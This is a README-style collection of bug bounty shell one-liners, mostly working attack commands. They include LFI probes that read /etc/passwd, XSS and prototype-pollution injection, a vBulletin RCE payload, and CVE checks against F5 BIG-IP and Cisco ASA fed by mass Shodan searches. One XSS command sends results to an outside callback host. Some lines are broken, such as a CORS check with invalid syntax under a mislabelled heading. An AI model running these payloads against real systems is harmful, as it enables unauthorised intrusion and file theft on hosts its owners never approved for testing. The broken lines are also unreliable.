# Awesome One-liner Bug Bounty Tips By Lostsec, (Not Official Readme)

Welcome to the repository of awesome one-liner scripts, specifically curated for bug bounty hunting. This collection includes powerful commands contributed by the community, designed to aid in various vulnerability assessments and security testing scenarios.

## Definitions

Before diving into the commands, here are some definitions used throughout the scripts:

- **HOST**: Refers to a hostname, (sub)domain, or IP address.
- **HOSTS.txt**: File containing multiple HOST entries.
- **URL**: Refers to a URL starting with HTTP/HTTPS protocol.
- **URLS.txt**: File containing multiple URL entries.
- **FILE.txt**, **FILE{N}.txt**: File(s) required for command/script execution.
- **OUT.txt**, **OUT{N}.txt**: File where command output is stored.

## Commands

### Local File Inclusion (LFI)

```bash
gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

### Open Redirect

```bash
export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

### XSS (Cross-Site Scripting)

```bash
gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
```

```bash
waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt
```

```bash
cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
```

### Prototype Pollution

```bash
subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```

### CVE-2020-5902 (F5 BIG-IP)

```bash
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host; do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n"; done
```

### CVE-2020-3452 (Cisco ASA)

```bash
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
```

### CVE-2022-0378 (Pulse Connect Secure)

```bash
cat URLS.txt | while read h; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x" | grep -qs "onmouse" && echo "$h: VULNERABLE"; done
```

### vBulletin 5.6.2 - Remote Code Execution

```bash
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host; do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n"; done;
```

### Find JavaScript Files

```bash
site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done
```

### Find Hidden Servers and/or Admin Panels

```bash
ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt
```

### Recon Using api.recon.dev

```bash
curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=HOST | jg .[].domain
```

### Find Live Host/Domain/Assets

```bash
subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
```

### XSS without gf

```bash
waybackurls HOST | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done
```

### Get Subdomains from IPs

```bash
python3 hosthunter.py HOSTS.txt > OUT.txt
```

### Gather Domains from Content-Security-Policy

```bash
curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
```

### Nmap IP:PORT Parser Piped to HTTPX

```bash
nmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r '.nmaprun.host | (.address["@addr"] + ":" + .ports.port[]["@portid"])' | httpx --silent
```

---

## Contribution

Contributions and suggestions are warmly welcomed to expand and enhance this repository. Feel free to submit your own one-liner scripts via pull requests.

## Credits

- Contributors: Various bug bounty hunters mentioned alongside their scripts.
- Maintainer: @lostsec

---

This README serves as a comprehensive guide to utilizing these one-liner scripts effectively for bug bounty hunting and security testing. Happy hunting! 🐞💻
